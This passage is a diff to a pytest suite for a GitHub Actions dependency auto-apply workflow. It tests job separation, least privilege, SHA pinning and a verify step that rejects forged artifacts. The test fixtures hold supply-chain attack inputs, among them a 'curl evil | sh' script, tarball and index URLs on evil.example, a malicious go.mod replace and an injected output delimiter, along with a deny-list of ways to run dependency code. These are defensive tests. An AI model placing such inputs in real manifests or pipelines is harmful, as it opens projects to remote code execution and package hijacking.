@@ -20,6 +20,8 @@ Run:  python -m pytest scripts/tests -q
 """
 from __future__ import annotations
 
+import hashlib
+import json
 import os
 import re
 import shutil
@@ -50,12 +52,18 @@ def bash_exe() -> str:
 
 BASH = bash_exe()
 WORKFLOW = yaml.safe_load(TEMPLATE.read_text(encoding="utf-8"))
-STEPS = WORKFLOW["jobs"]["apply"]["steps"]
+JOBS = WORKFLOW["jobs"]
+STEPS = JOBS["apply"]["steps"]
 EXPR = re.compile(r"^\$\{\{\s*([^}]+?)\s*\}\}$")
 
 
 def step(step_id: str) -> dict:
     [s] = [s for s in STEPS if s.get("id") == step_id]
+    return s
+
+
+def publish_step(step_id: str) -> dict:
+    [s] = [s for s in JOBS["publish"]["steps"] if s.get("id") == step_id]
     return s
 
 
@@ -115,6 +123,13 @@ case "$1" in
 esac
 echo "go shim: unexpected $*" >&2; exit 99
 ''',
+    # Records what curl was given: argv one per line, stdin verbatim.
+    "curl": r'''
+printf '%s\n' "$@" > "$CURL_ARGV"
+cat > "$CURL_STDIN"
+exit 0
+''',
+    "jq": "echo '{}'\n",
     "pip-audit": r'''
 out=""; req=""
 while [ $# -gt 0 ]; do
@@ -187,20 +202,26 @@ def parse_outputs(text: str) -> dict[str, str]:
     return out
 
 
-def run_step(step_id: str, cwd: Path, shim_path: str, env_values: dict[str, str], **fake: str):
+def run_step(step_id: str, cwd: Path, shim_path: str, env_values: dict[str, str], *, job: str = "apply", **fake: str):
     """Run a step as Actions would: its `env:` expressions are evaluated from
     env_values, and the script sees only environment variables."""
-    s = step(step_id)
+    [s] = [x for x in JOBS[job]["steps"] if x.get("id") == step_id]
     env = {}
     for name, expr in s.get("env", {}).items():
+        if name in fake:
+            continue  # supplied verbatim by the test
         m = EXPR.match(str(expr))
         assert m and m.group(1) in env_values, f"{step_id} env {name} uses an expression this test does not model: {expr}"
         env[name] = env_values[m.group(1)]
     gh_out = cwd.parent / f"out-{step_id}"
     gh_out.write_text("", encoding="utf-8")
     summary = cwd.parent / f"summary-{step_id}"
+    # From a file, as Actions runs it (`bash --noprofile --norc -eo pipefail
+    # {0}`): a long body passed with -c is cut at the Windows command-line limit.
+    script = cwd.parent / f"step-{step_id}.sh"
+    script.write_text(s["run"], encoding="utf-8", newline="\n")
     proc = subprocess.run(
-        [BASH, "-c", s["run"]], cwd=cwd, capture_output=True, text=True,
+        [BASH, "--noprofile", "--norc", "-eo", "pipefail", bash_path(script)], cwd=cwd, capture_output=True, text=True,
         env={**os.environ, **env, **fake, "PATH": shim_path,
              "GITHUB_OUTPUT": gh_out.as_posix(), "GITHUB_STEP_SUMMARY": summary.as_posix()},
     )
@@ -247,12 +268,16 @@ def test_npm_test_failure_reaches_the_broken_pr_path(tmp_path, shim_path):
     assert "No dependency changes" not in agg.stdout
 
 
-def test_broken_pr_step_is_gated_on_the_aggregate():
-    broken = [s for s in STEPS if s.get("id") == "pr_broken"][0]["if"]
-    ok = [s for s in STEPS if s.get("id") == "pr_ok"][0]["if"]
-    assert "steps.agg.outputs.any_changed == 'true'" in broken
-    assert "steps.agg.outputs.tests_failed == 'true'" in broken
-    assert "steps.agg.outputs.tests_failed != 'true'" in ok
+def test_broken_pr_step_is_gated_on_the_verified_result():
+    # The aggregate decides whether `publish` runs at all; inside it, the PR
+    # path is chosen from the artifact the verify step validated.
+    assert "needs.apply.outputs.any_changed == 'true'" in JOBS["publish"]["if"]
+    assert JOBS["apply"]["outputs"]["any_changed"] == "${{ steps.agg.outputs.any_changed }}"
+    broken = publish_step("pr_broken")["if"]
+    ok = publish_step("pr_ok")["if"]
+    assert "steps.verify.outputs.pr_kind == 'broken'" in broken
+    assert "steps.verify.outputs.pr_kind == 'ok'" in ok
+    assert "needs.apply.result == 'success'" in broken and "needs.apply.result == 'success'" in ok
 
 
 def test_a_test_failure_alone_still_counts_as_a_change(tmp_path, shim_path):
@@ -430,7 +455,7 @@ def test_detect_matches_security_audit(tmp_path, shim_path):
 # ─── structure ───────────────────────────────────────────────────────────────
 
 def test_no_expression_is_pasted_into_any_run_body():
-    offenders = [s.get("name") or s.get("id") for s in STEPS if "${{" in s.get("run", "")]
+    offenders = [s.get("name") or s.get("id") for j in JOBS.values() for s in j["steps"] if "${{" in s.get("run", "")]
     assert offenders == [], "values must reach run: through env, never ${{ }}: " + ", ".join(offenders)
 
 
@@ -460,9 +485,832 @@ def test_checkouts_do_not_persist_the_token(path):
 def test_ntfy_is_opt_in_and_never_the_public_topic():
     text = TEMPLATE.read_text(encoding="utf-8")
     assert "ntfy.sh/nexus-alerts" not in text
-    [notify] = [s for s in STEPS if "ntfy" in (s.get("name") or "").lower()]
+    [notify] = [s for s in JOBS["notify"]["steps"] if "ntfy" in (s.get("name") or "").lower()]
     assert "vars.DEP_AUTO_APPLY_NTFY_URL != ''" in notify["if"]
 
 
 def test_dev_standards_own_copy_matches_the_template():
     assert OWN_COPY.read_bytes() == TEMPLATE.read_bytes()
+
+
+# ─── privilege boundary (audit-dev-standards-2026-10-10 HIGH 2) ──────────────
+# Dependency-controlled code (install lifecycle scripts, audit fixes, builds,
+# test suites) and credential-holding steps must never share a job: within a
+# job, earlier code can plant $GITHUB_PATH entries, tools or tracked-file edits
+# that every later step then runs with the job's token and secrets.
+
+# Every way a step could run repo- or dependency-controlled code: the package
+# managers of the ecosystems this workflow handles, plus the generic spellings
+# (npx, node, make, a script run from the checkout, python -m <anything>,
+# other build tools). A deny-list can always miss a spelling, so the publish
+# job is additionally pinned to exact run: bodies (PUBLISH_RUN_SHA256 below).
+DEP_CODE = re.compile(
+    r"\b(?:npm|pnpm|yarn|bun)\s+(?:ci|install|i|test|run|exec|audit|update|rebuild|dedupe|x)\b"
+    r"|\b(?:npx|pnpx|bunx|corepack|govulncheck|pytest|tox|nox|pip-audit)\b"
+    r"|\bnode\s|\bdeno\s|\bmake\b|\bcargo\s|\bgradlew?\b|\bmvnw?\b|\bbundle\s|\bdotnet\s|\brake\b"
+    r"|\bgo\s+(?:build|test|get|install|run|generate|mod|vet)\b"
+    r"|\bpip3?\s+install\b|\bpython[0-9.]*\s+(?:-[A-Za-z]+\s+)*-m\s+\w|\bpython[0-9.]*\s+[\w./-]+\.py\b"
+    r"|\bpoetry\s+\w+|\buv\s+(?:pip|sync|run|add|lock)\b"
+    r"|\b(?:ba|z)?sh\s+(?:-\w+\s+)*\.{0,2}/[\w.-]|(?:^|[\s;&|(])\.{1,2}/[\w.-]+"
+)
+SETUP_TOOLCHAIN = re.compile(r"^actions/setup-(?:node|go|python|java|dotnet)@")
+USES_LINE = re.compile(r"^\s*(?:-\s+)?uses:\s*(?P<ref>\S+)(?P<rest>.*)$")
+PINNED = re.compile(r"^[A-Za-z0-9._-]+/[A-Za-z0-9._/-]+@[0-9a-f]{40}$")
+SAME_LINE_VERSION = re.compile(r"^\s+#\s+v\d+(\.\d+){0,2}\s*$")
+
+
+def runs_dependency_code(s: dict) -> bool:
+    return bool(DEP_CODE.search(s.get("run", ""))) or bool(SETUP_TOOLCHAIN.match(str(s.get("uses", ""))))
+
+
+def test_the_dependency_code_regex_sees_every_ecosystem_step():
+    # Guard against the boundary tests passing vacuously.
+    for step_id in ("npm", "go", "python"):
+        assert runs_dependency_code(step(step_id)), step_id
+
+
+def test_workflow_grants_nothing_by_default():
+    assert WORKFLOW["permissions"] == {}
+    assert "secrets." not in yaml.safe_dump(WORKFLOW.get("env", {}))
+    for name, job in JOBS.items():
+        assert "permissions" in job, f"{name} must declare its own permissions"
+
+
+@pytest.mark.parametrize("name", sorted(JOBS))
+def test_a_job_that_runs_dependency_code_holds_no_secret_and_no_write(name):
+    job = JOBS[name]
+    if not any(runs_dependency_code(s) for s in job["steps"]):
+        return
+    assert "secrets." not in yaml.safe_dump(job), f"{name} runs dependency code and references a secret"
+    perms = job["permissions"]
+    assert isinstance(perms, dict) and all(v in ("read", "none") for v in perms.values()), \
+        f"{name} runs dependency code with {perms}"
+
+
+def test_publish_runs_no_dependency_code():
+    publish = JOBS["publish"]
+    offenders = [s.get("name") or s.get("uses") for s in publish["steps"] if runs_dependency_code(s)]
+    assert offenders == [], offenders
+    actions = {str(s["uses"]).split("@")[0] for s in publish["steps"] if "uses" in s}
+    assert actions == {"actions/checkout", "actions/download-artifact", "peter-evans/create-pull-request"}, actions
+    assert publish["needs"] == "apply"
+
+
+def test_write_token_and_secrets_live_in_different_jobs():
+    assert JOBS["apply"]["permissions"] == {"contents": "read"}
+    assert JOBS["publish"]["permissions"] == {"contents": "write", "pull-requests": "write"}
+    assert JOBS["notify"]["permissions"] == {}
+    assert "secrets." not in yaml.safe_dump(JOBS["publish"])
+    assert "secrets." in yaml.safe_dump(JOBS["notify"])
+    assert set(JOBS) == {"apply", "publish", "notify"}
+
+
+@pytest.mark.parametrize("name", sorted(JOBS))
+def test_a_secret_holding_job_runs_no_third_party_action(name):
+    # Gate pass 2 (SC-29): a third-party action release can rewrite
+    # $GITHUB_PATH/$GITHUB_ENV for every later step of its job, so no job that
+    # references a secret may use one. Only actions/* (first-party) qualify.
+    job = JOBS[name]
+    if "secrets." not in yaml.safe_dump(job):
+        return
+    third_party = [s["uses"] for s in job["steps"] if "uses" in s and not str(s["uses"]).startswith("actions/")]
+    assert third_party == [], f"{name} holds a secret and runs {third_party}"
+    assert not any(runs_dependency_code(s) for s in job["steps"])
+
+
+def test_notify_runs_no_action_and_takes_publish_values_through_env():
+    notify = JOBS["notify"]
+    assert all("uses" not in s for s in notify["steps"])
+    assert notify["needs"] == ["apply", "publish"]
+    for s in notify["steps"]:
+        assert "needs.publish.outputs" not in s.get("run", "")
+    outs = JOBS["publish"]["outputs"]
+    assert set(outs) == {"pr_ok_url", "pr_broken_url", "date_str"}
+
+
+def test_every_pr_step_commits_only_the_verified_paths():
+    cprs = [s for j in JOBS.values() for s in j["steps"]
+            if str(s.get("uses", "")).startswith("peter-evans/create-pull-request@")]
+    assert len(cprs) == 2
+    for s in cprs:
+        assert s["with"].get("add-paths") == "${{ steps.verify.outputs.add_paths }}", s.get("id")
+        # The body comes from a file the verify step built, not pasted outputs.
+        assert "body" not in s["with"] and s["with"]["body-path"] == "${{ steps.verify.outputs.body_path }}"
+        dumped = yaml.safe_dump(s)
+        assert "steps.agg" not in dumped and "needs.apply.outputs" not in dumped
+
+
+def test_apply_job_uploads_and_publish_downloads_outside_the_workspace():
+    [up] = [s for s in STEPS if str(s.get("uses", "")).startswith("actions/upload-artifact@")]
+    [down] = [s for s in JOBS["publish"]["steps"] if str(s.get("uses", "")).startswith("actions/download-artifact@")]
+    assert up["with"]["name"] == down["with"]["name"]
+    assert up["with"]["path"].startswith("${{ runner.temp }}")
+    assert down["with"]["path"].startswith("${{ runner.temp }}")
+
+
+def test_apply_job_does_not_publish_a_cache():
+    for s in STEPS:
+        if str(s.get("uses", "")).startswith("actions/setup-go@"):
+            assert s["with"]["cache"] is False
+
+
+@pytest.mark.parametrize("path", [TEMPLATE, OWN_COPY])
+def test_every_action_is_sha_pinned_with_a_same_line_version(path):
+    bad = []
+    for n, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
+        m = USES_LINE.match(line)
+        if not m:
+            continue
+        if not PINNED.match(m.group("ref")) or not SAME_LINE_VERSION.match(m.group("rest")):
+            bad.append(f"{n}: {line.strip()}")
+    assert bad == [], bad
+
+
+def test_outputs_never_use_a_fixed_delimiter():
+    # SC-34: a fixed delimiter lets content end the value early and forge outputs.
+    for j in JOBS.values():
+        for s in j["steps"]:
+            body = s.get("run", "")
+            assert not re.search(r"echo\s+\"?\w+<<\w+\"?\s*$", body, re.M), s.get("id")
+            assert 'printf "%b"' not in body, s.get("id")
+
+
+ALLOWED = re.compile(WORKFLOW["env"]["ALLOWED_MANIFEST_RE"])
+
+
+@pytest.mark.parametrize("path", [
+    "package.json", "web/package-lock.json", "a/b/pnpm-lock.yaml", "npm-shrinkwrap.json",
+    "go.mod", "svc/go.sum", "requirements.txt", "api/requirements-dev.txt",
+])
+def test_allow_list_admits_what_auto_apply_writes(path):
+    assert ALLOWED.fullmatch(path)
+
+
+@pytest.mark.parametrize("path", [
+    ".github/workflows/ci.yml", "src/index.js", "yarn.lock", "pyproject.toml", "Dockerfile",
+    "package.json.bak", ".npmrc", "dir/requirements.txt/evil", "web/package,json",
+    "a b/package.json", "requirements.txt\n", ":(glob)package.json",
+])
+def test_allow_list_refuses_everything_else(path):
+    assert not ALLOWED.fullmatch(path)
+
+
+# ─── the hand-over, end to end: package in `apply`, verify in `publish` ──────
+
+def commit_all(repo: Path) -> str:
+    subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t",
+                    "commit", "-qm", "base"], check=True)
+    return subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], check=True,
+                          capture_output=True, text=True).stdout.strip()
+
+
+def base_repo(tmp_path: Path, files: dict[str, str]) -> Path:
+    repo = git_repo(tmp_path, files)
+    subprocess.run(["git", "-C", str(repo), "config", "core.autocrlf", "false"], check=True)
+    commit_all(repo)
+    return repo
+
+
+def fresh_checkout(tmp_path: Path, repo: Path) -> Path:
+    dest = tmp_path / "publish-checkout"
+    subprocess.run(["git", "clone", "-q", "-c", "core.autocrlf=false", str(repo), str(dest)], check=True)
+    return dest
+
+
+def write(repo: Path, rel: str, text: str) -> None:
+    p = repo / rel
+    p.parent.mkdir(parents=True, exist_ok=True)
+    p.write_text(text, encoding="utf-8", newline="\n")
+
+
+LOCK = ('{\n  "name": "t",\n  "lockfileVersion": 3,\n  "packages": {\n    "node_modules/a": {\n'
+        '      "version": "1.0.0",\n      "resolved": "https://registry.npmjs.org/a/-/a-1.0.0.tgz"\n    }\n  }\n}\n')
+PKG_DEPS = ('{\n  "name": "t",\n  "version": "1.0.0",\n  "scripts": {"test": "node test.js"},\n'
+            '  "dependencies": {"a": "^1.0.0"}\n}\n')
+
+PACKAGE_VALUES = {f"steps.{eco}.outputs.{k}": "" for eco in ("npm", "go", "python") for k in ("changed", "tests", "notes")}
+PACKAGE_VALUES.update({"steps.docker.outputs.notes": "", "steps.actions.outputs.notes": "",
+                       "steps.agg.outputs.any_changed": "true", "steps.agg.outputs.tests_failed": "false",
+                       "steps.npm.outputs.changed": "true", "steps.npm.outputs.tests": "passed",
+                       "steps.npm.outputs.notes": "bumped ."})
+
+
+def run_package(tmp_path: Path, shim_path: str, repo: Path):
+    runner_temp = tmp_path / "runner-temp-apply"
+    runner_temp.mkdir()
+    proc = run_step("package", repo, shim_path, PACKAGE_VALUES,
+                    RUNNER_TEMP=runner_temp.as_posix(), ALLOWED_MANIFEST_RE=WORKFLOW["env"]["ALLOWED_MANIFEST_RE"])
+    return proc, runner_temp / "dep-auto-apply"
+
+
+def run_verify(tmp_path: Path, shim_path: str, checkout: Path, artifact_dir: Path):
+    runner_temp = tmp_path / "runner-temp-publish"
+    runner_temp.mkdir()
+    shutil.copytree(artifact_dir, runner_temp / "dep-auto-apply")
+    return run_step("verify", checkout, shim_path, {}, job="publish",
+                    RUNNER_TEMP=runner_temp.as_posix(), ALLOWED_MANIFEST_RE=WORKFLOW["env"]["ALLOWED_MANIFEST_RE"],
+                    GITHUB_SERVER_URL="https://github.com", GITHUB_REPOSITORY="o/r", GITHUB_RUN_ID="1")
+
+
+def staged(checkout: Path) -> list[str]:
+    out = subprocess.run(["git", "-C", str(checkout), "diff", "--cached", "--name-only"],
+                         check=True, capture_output=True, text=True).stdout
+    return sorted(out.split())
+
+
+def test_round_trip_ships_only_allow_listed_files(tmp_path, shim_path):
+    repo = base_repo(tmp_path, {"package.json": PKG_DEPS, "package-lock.json": LOCK, "README.md": "hi\n"})
+    checkout = fresh_checkout(tmp_path, repo)
+    # What the apply job leaves behind: a real bump plus an edit a lifecycle
+    # script made to a tracked file that is not a manifest.
+    write(repo, "package-lock.json", LOCK.replace("1.0.0", "1.0.1"))
+    write(repo, "package.json", PKG_DEPS.replace('"^1.0.0"', '"^1.0.1"'))
+    write(repo, "README.md", "owned\n")
+    proc, art = run_package(tmp_path, shim_path, repo)
+    assert proc.returncode == 0, proc.stdout + proc.stderr
+    patch = (art / "deps.patch").read_text(encoding="utf-8")
+    assert "package-lock.json" in patch and "package.json" in patch and "README.md" not in patch
+    result = json.loads((art / "result.json").read_text(encoding="utf-8"))
+    assert result["dropped"] == ["README.md"]
+    assert "will not ship 'README.md'" in proc.stdout
+
+    v = run_verify(tmp_path, shim_path, checkout, art)
+    assert v.returncode == 0, v.stdout + v.stderr
+    assert staged(checkout) == ["package-lock.json", "package.json"]
+    assert v.outputs["add_paths"].splitlines() == [":(literal)package-lock.json", ":(literal)package.json"]
+    assert v.outputs["pr_kind"] == "ok"
+    assert re.fullmatch(r"auto-apply/\d{4}-\d{2}-\d{2}", v.outputs["branch"])
+    body = Path(v.outputs["body_path"]).read_text(encoding="utf-8")
+    assert "README.md" in body and "Weekly auto-apply (Layer B)" in body
+    assert (checkout / "README.md").read_text(encoding="utf-8") == "hi\n"
+
+
+def test_tests_failed_reaches_the_broken_pr_through_the_artifact(tmp_path, shim_path):
+    repo = base_repo(tmp_path, {"package-lock.json": LOCK})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "package-lock.json", LOCK.replace("1.0.0", "1.0.1"))
+    eco = {e: {"changed": "true", "tests": "passed", "notes": ""} for e in ("npm", "go", "python")}
+    eco["go"]["tests"] = "failed"
+    art = forged_artifact(tmp_path, repo, raw_patch(repo), tests_failed="true", ecosystems=eco)
+    v = run_verify(tmp_path, shim_path, checkout, art)
+    assert v.returncode == 0, v.stdout + v.stderr
+    assert v.outputs["pr_kind"] == "broken"
+    assert "TESTS FAILED" in Path(v.outputs["body_path"]).read_text(encoding="utf-8")
+
+
+def test_new_go_sum_is_shipped(tmp_path, shim_path):
+    gomod = "module example.com/t\n\ngo 1.22\n\nrequire golang.org/x/text v0.3.5\n"
+    repo = base_repo(tmp_path, {"svc/go.mod": gomod})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "svc/go.mod", gomod.replace("v0.3.5", "v0.3.8"))
+    write(repo, "svc/go.sum", "golang.org/x/text v0.3.8 h1:" + "A" * 43 + "=\n"
+                              "golang.org/x/text v0.3.8/go.mod h1:" + "B" * 43 + "=\n")
+    proc, art = run_package(tmp_path, shim_path, repo)
+    assert proc.returncode == 0, proc.stdout + proc.stderr
+    v = run_verify(tmp_path, shim_path, checkout, art)
+    assert v.returncode == 0, v.stdout + v.stderr
+    assert staged(checkout) == ["svc/go.mod", "svc/go.sum"]
+
+
+def raw_patch(repo: Path) -> bytes:
+    return subprocess.run(["git", "-C", str(repo), "diff", "--no-color"], check=True, capture_output=True).stdout
+
+
+def forged_artifact(tmp_path: Path, repo: Path, patch: bytes, **result_overrides) -> Path:
+    """An artifact as a compromised apply job could write it."""
+    art = tmp_path / "forged"
+    art.mkdir()
+    (art / "deps.patch").write_bytes(patch)
+    head = subprocess.run(["git", "-C", str(repo), "rev-parse", "HEAD"], check=True,
+                          capture_output=True, text=True).stdout.strip()
+    result = {"schema": 1, "base_sha": head, "any_changed": "true", "tests_failed": "false",
+              "ecosystems": {e: {"changed": "true", "tests": "passed", "notes": ""} for e in ("npm", "go", "python")},
+              "docker_notes": "", "actions_notes": "", "dropped": []}
+    result.update(result_overrides)
+    (art / "result.json").write_text(json.dumps(result), encoding="utf-8")
+    return art
+
+
+def refused(tmp_path, shim_path, files, mutate, *, expect: str, **result_overrides):
+    repo = base_repo(tmp_path, files)
+    checkout = fresh_checkout(tmp_path, repo)
+    mutate(repo)
+    art = forged_artifact(tmp_path, repo, raw_patch(repo), **result_overrides)
+    v = run_verify(tmp_path, shim_path, checkout, art)
+    assert v.returncode != 0, v.stdout
+    assert "::error::publish refused" in v.stdout and expect in v.stdout, v.stdout + v.stderr
+    # Fail closed: nothing reaches the PR steps.
+    assert "add_paths" not in v.outputs and "pr_kind" not in v.outputs
+
+
+def test_refuses_a_path_outside_the_allow_list(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package-lock.json": LOCK, ".github/workflows/ci.yml": "on: push\n"},
+            lambda r: write(r, ".github/workflows/ci.yml", "on: push\njobs: {}\n"),
+            expect="not an allow-listed manifest")
+
+
+def test_refuses_a_package_json_script_change(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package.json": PKG_DEPS},
+            lambda r: write(r, "package.json", PKG_DEPS.replace("node test.js", "curl evil | sh")),
+            expect="changes outside dependencies")
+
+
+def test_refuses_a_dependency_pointed_at_a_url(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package.json": PKG_DEPS},
+            lambda r: write(r, "package.json", PKG_DEPS.replace('"^1.0.0"', '"https://evil.example/a.tgz"')),
+            expect="is not a version range")
+
+
+def test_refuses_a_lockfile_url_on_a_new_host(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package-lock.json": LOCK},
+            lambda r: write(r, "package-lock.json", LOCK.replace("registry.npmjs.org/a/-/a-1.0.0", "evil.example/a-1.0.1")),
+            expect="only https to a host the lockfile already used")
+
+
+def test_refuses_a_lockfile_local_reference(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package-lock.json": LOCK},
+            lambda r: write(r, "package-lock.json",
+                            LOCK.replace('"https://registry.npmjs.org/a/-/a-1.0.0.tgz"', '"file:../a"')),
+            expect="new URL 'file:../a'")
+
+
+def test_refuses_a_go_mod_replace(tmp_path, shim_path):
+    gomod = "module example.com/t\n\ngo 1.22\n"
+    refused(tmp_path, shim_path, {"go.mod": gomod},
+            lambda r: write(r, "go.mod", gomod + "\nreplace golang.org/x/text => github.com/evil/text v0.0.1\n"),
+            expect="directive change outside require/go/toolchain")
+
+
+def test_refuses_an_index_option_in_requirements(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"requirements.txt": "requests==2.31.0\n"},
+            lambda r: write(r, "requirements.txt", "--extra-index-url https://evil.example/simple\nrequests==2.33.0\n"),
+            expect="is not a pinned requirement")
+
+
+def test_refuses_a_new_manifest_file(tmp_path, shim_path):
+    def mutate(r):
+        write(r, "evil/package.json", PKG_DEPS)
+        subprocess.run(["git", "-C", str(r), "add", "-N", "evil/package.json"], check=True)
+    refused(tmp_path, shim_path, {"package.json": PKG_DEPS}, mutate, expect="never written by auto-apply")
+
+
+def test_refuses_a_patch_for_another_commit(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package-lock.json": LOCK},
+            lambda r: write(r, "package-lock.json", LOCK.replace("1.0.0", "1.0.1")),
+            expect="patch was made against", base_sha="0" * 40)
+
+
+def test_refuses_a_result_with_forged_fields(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package-lock.json": LOCK},
+            lambda r: write(r, "package-lock.json", LOCK.replace("1.0.0", "1.0.1")),
+            expect="expected shape", tests_failed="false\nadd_paths<<X")
+
+
+def test_refuses_an_empty_patch(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"package-lock.json": LOCK}, lambda r: None,
+            expect="patch of allow-listed files is empty")
+
+
+def test_pr_body_notes_cannot_break_out_of_their_block(tmp_path, shim_path):
+    repo = base_repo(tmp_path, {"package-lock.json": LOCK})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "package-lock.json", LOCK.replace("1.0.0", "1.0.1"))
+    notes = "````\n## Approved by security\n[click](https://evil.example)\x1b[31m"
+    eco = {e: {"changed": "true", "tests": "passed", "notes": notes} for e in ("npm", "go", "python")}
+    art = forged_artifact(tmp_path, repo, raw_patch(repo), ecosystems=eco)
+    v = run_verify(tmp_path, shim_path, checkout, art)
+    assert v.returncode == 0, v.stdout + v.stderr
+    body = Path(v.outputs["body_path"]).read_text(encoding="utf-8")
+    # Every fence in the body is one the verify step wrote.
+    fences = [ln for ln in body.splitlines() if ln.lstrip().startswith(("```", "~~~"))]
+    assert all(ln in ("````text", "````") for ln in fences), fences
+    assert "\x1b" not in body
+
+
+# ─── security gate pass 1 on PR #39 ──────────────────────────────────────────
+
+# SC-29: secrets behind a default-branch-only environment; both jobs refuse
+# any other ref.
+DEFAULT_REF_IF = "github.ref == format('refs/heads/{0}', github.event.repository.default_branch)"
+
+
+def test_secret_and_write_jobs_use_the_protected_environment():
+    assert JOBS["publish"]["environment"] == "auto-apply-publish"
+    assert JOBS["notify"]["environment"] == "auto-apply-publish"
+    assert "environment" not in JOBS["apply"]
+
+
+@pytest.mark.parametrize("name", ["apply", "publish", "notify"])
+def test_both_jobs_refuse_any_ref_but_the_default_branch(name):
+    job = JOBS[name]
+    assert DEFAULT_REF_IF in job["if"]
+    first = job["steps"][0]
+    assert first.get("id") == "ref_guard" and "if" not in first
+    assert first == JOBS["apply"]["steps"][0]
+
+
+@pytest.mark.parametrize("ref,default,rc", [
+    ("refs/heads/main", "main", 0),
+    ("refs/heads/evil", "main", 1),
+    ("refs/heads/main-x", "main", 1),
+    ("refs/tags/main", "main", 1),
+    ("refs/heads/main", "", 1),
+])
+def test_ref_guard_step(tmp_path, shim_path, ref, default, rc):
+    work = tmp_path / "w"
+    work.mkdir()
+    proc = run_step("ref_guard", work, shim_path, {}, REF=ref, DEFAULT_BRANCH=default)
+    assert proc.returncode == rc, proc.stdout + proc.stderr
+
+
+# SC-20: the publish job is pinned to exact steps and run: bodies. A changed
+# body fails here until a reviewer has read it for dependency code and
+# updated the hash; the DEP_CODE deny-list is the second line.
+PUBLISH_STEPS = [
+    "id:ref_guard",
+    "uses:actions/checkout",
+    "uses:actions/download-artifact",
+    "id:verify",
+    "id:pr_ok",
+    "id:pr_broken",
+]
+NOTIFY_STEPS = ["id:ref_guard", "id:notify", "id:brain"]
+RUN_SHA256 = {
+    "publish": {
+        "ref_guard": "f944f58d7d43bca488268dd06ecf86470697f3f4c4e0c1be968269f97cb7dd5e",
+        "verify": "f3827ed24ddddac7537703a451bd33b8ac2c28fcdd929aecb44eb3fbe01c4a56",
+    },
+    "notify": {
+        "ref_guard": "f944f58d7d43bca488268dd06ecf86470697f3f4c4e0c1be968269f97cb7dd5e",
+        "notify": "dac4e53d86d42985dfee24e29f219d0c06f554e76c1b81ba73c016c381a93cf6",
+        "brain": "77e973a7709ddc0a807805543e3c2b6c14971d37ffb7dc64c0dd99606b7a205b",
+    },
+}
+
+
+@pytest.mark.parametrize("name,expected", [("publish", PUBLISH_STEPS), ("notify", NOTIFY_STEPS)])
+def test_publish_step_list_is_fixed(name, expected):
+    got = [f"id:{s['id']}" if "id" in s else "uses:" + str(s["uses"]).split("@")[0]
+           for s in JOBS[name]["steps"]]
+    assert got == expected
+
+
+@pytest.mark.parametrize("name", ["publish", "notify"])
+def test_publish_run_bodies_are_exactly_the_reviewed_ones(name):
+    got = {s["id"]: hashlib.sha256(s["run"].encode("utf-8")).hexdigest()
+           for s in JOBS[name]["steps"] if "run" in s}
+    assert got == RUN_SHA256[name], (
+        f"a {name} run: body changed. Read it for anything that executes repo or dependency "
+        "code, then update RUN_SHA256")
+
+
+@pytest.mark.parametrize("spelling", [
+    "npx some-tool", "node scripts/x.js", "make", "make build", "bash ./x", "sh ./x.sh", "bash -e ../x",
+    "python -m other", "python3 -m build", "python setup.py", "cargo build", "gradle build",
+    "./gradlew test", "mvn package", "bundle exec rake", "./configure", "(cd x && ./run)",
+    "npm ci", "pnpm install", "yarn install", "go test ./...", "pip install -r r.txt", "pytest",
+    "poetry install", "uv sync", "corepack enable", "dotnet build", "deno run x.ts",
+])
+def test_dependency_code_spelling_matrix(spelling):
+    assert DEP_CODE.search(spelling), spelling
+
+
+@pytest.mark.parametrize("benign", [
+    "node_modules", "git apply --index", "python3 -I - <<'PY'", "makes sense", "bundled", "cargo-cult",
+    "printf '%s\\n' \"$cfg\" | curl -K - -fsS", "jq -nc",
+])
+def test_dependency_code_regex_spares_what_publish_does(benign):
+    assert not DEP_CODE.search(benign), benign
+
+
+# SC-13: validators. Each spelling below is refused; the comment in the
+# workflow states exactly these rules.
+GOMOD = "module example.com/t\n\ngo 1.22\n\nrequire golang.org/x/text v0.3.5\n"
+
+
+@pytest.mark.parametrize("addition", [
+    "retract v1.0.0\n",
+    "retract [v1.0.0, v1.0.5]\n",
+    "retract (\n\tv1.0.0\n\tv1.0.1\n)\n",
+    "exclude golang.org/x/text v0.3.5\n",
+    "exclude (\n\tgolang.org/x/text v0.3.5\n)\n",
+    "replace golang.org/x/text => ../text\n",
+    "replace (\n\tgolang.org/x/text => github.com/evil/text v0.0.1\n)\n",
+    "godebug default=go1.20\n",
+    "tool example.com/evil/cmd\n",
+])
+def test_refuses_go_mod_directives(tmp_path, shim_path, addition):
+    refused(tmp_path, shim_path, {"go.mod": GOMOD}, lambda r: write(r, "go.mod", GOMOD + "\n" + addition),
+            expect="directive change outside require/go/toolchain")
+
+
+def test_refuses_a_require_that_is_not_module_and_version(tmp_path, shim_path):
+    refused(tmp_path, shim_path, {"go.mod": GOMOD},
+            lambda r: write(r, "go.mod", GOMOD.replace("v0.3.5", "v0.3.8 => ../text")),
+            expect="is not `module vX`")
+
+
+def test_go_mod_keeps_an_existing_replace_and_may_bump_require(tmp_path, shim_path):
+    base = ("module example.com/t\n\ngo 1.22\n\nrequire (\n\tgolang.org/x/text v0.3.5 // indirect\n)\n\n"
+            "replace example.com/a => ./a\n")
+    repo = base_repo(tmp_path, {"go.mod": base})
+    checkout = fresh_checkout(tmp_path, repo)
+    write(repo, "go.mod", base.replace("v0.3.5", "v0.3.8").replace("go 1.22\n", "go 1.22.1\n\ntoolchain go1.22.5\n"))
+    art = forged_artifact(tmp_path, repo, raw_patch(repo))
+    v = run_verify(tmp_path, shim_path, checkout, art)
+    assert v.returncode == 0, v.stdout + v.stderr
+
+
+def test_refuses_an_altered_existing_replace(tmp_path, shim_path):
+    base = GOMOD + "\nreplace example.com/a => ./a\n"
